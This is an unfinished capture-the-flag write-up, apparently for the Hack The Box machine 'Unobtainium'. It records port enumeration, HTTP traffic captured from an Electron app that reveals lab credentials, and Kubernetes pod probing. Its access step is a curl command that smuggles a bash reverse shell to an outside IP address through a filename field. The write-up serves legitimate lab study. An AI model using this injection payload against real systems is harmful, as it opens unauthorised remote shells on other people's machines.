# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/0u1Asgr.png)
#### Port `8443`
- This port is a kubernetes port, but to access or send requests it needs credentials.
![](https://i.imgur.com/DBuh8CD.png)
#### Port `80`
![](https://i.imgur.com/oC9p2ut.jpeg)
![](https://i.imgur.com/9WtK6mW.png)
- Users: felamos <felamos@unobtainium.htb>
- I started the app and tried to analyze the app and this was the 1st request sent from the app.
```shell
HEAD / HTTP/1.1
Host: unobtainium.htb:31337
Connection: keep-alive
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US
If-None-Match: W/"2-l9Fw4VUO7kr8CvBlt4zaMCqXZ0w"
  
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 83
ETag: W/"53-2pKcuKlCOBKa3GLSIAm4J5pPZck"
Date: Mon, 27 May 2024 14:58:13 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```
- I kept analyzing and when i send data from the app this happened
```shell
PUT / HTTP/1.1
Host: unobtainium.htb:31337
Connection: keep-alive
Content-Length: 82
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: en-US

{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":"Hello Rex"}}

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 11
ETag: W/"b-Ai2R8hgEarLmHKwesT1qcY913ys"
Date: Mon, 27 May 2024 15:01:54 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"ok":true}
```
- ` felamos : Winter2021`
```http
POST /todo HTTP/1.1
Host: unobtainium.htb:31337
Connection: keep-alive
Content-Length: 73
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: en-US

{"auth":{"name":"felamos","password":"Winter2021"},"filename":"todo.txt"}

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 293
ETag: W/"125-tNs2+nU0UiQGmLreBy4Pj891aVA"
Date: Tue, 28 May 2024 04:39:40 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"ok":true,"content":"1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n"}
``` 
- The Credential is not working, so from our previous experiance the kubernetes needed auth. there for it might be for that,
- i pulled the request and added it to burpsuite.
![](https://i.imgur.com/9VDCUoC.png)
![](https://i.imgur.com/FpmqINf.png)

### Gaining Access
![](https://i.imgur.com/ZBTNG5O.png)
- ![](https://i.imgur.com/QjMGm1j.png)
![](https://i.imgur.com/hV3UKgR.png)
- `curl -X POST http://10.10.10.235:31337/upload -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash >& /dev/tcp/10.10.14.7/443 0>&1\""}'`

## Internal
### Enumeration
- Analyzing the kubernetes
	- ![](https://i.imgur.com/gWV138s.png)
```shell
(remote) root@webapp-deployment-9546bc7cb-zjnnh:/usr/src/app# curl -v 10.42.0.70:3000
* Expire in 0 ms for 6 (transfer 0x55f66fa510f0)
*   Trying 10.42.0.70...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x55f66fa510f0)
* Connected to 10.42.0.70 (10.42.0.70) port 3000 (#0)
> GET / HTTP/1.1
> Host: 10.42.0.70:3000
> User-Agent: curl/7.64.0
> Accept: */*
>
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Content-Type: application/json; charset=utf-8
< Content-Length: 2
< ETag: W/"2-l9Fw4VUO7kr8CvBlt4zaMCqXZ0w"
< Date: Tue, 28 May 2024 20:36:19 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
<
* Connection #0 to host 10.42.0.70 left intact
[]
```
- this looks as the before so we can do same exploit.
![](https://i.imgur.com/bNFImww.png)

### Gaining Access


### Maintaining Access


# Random Notes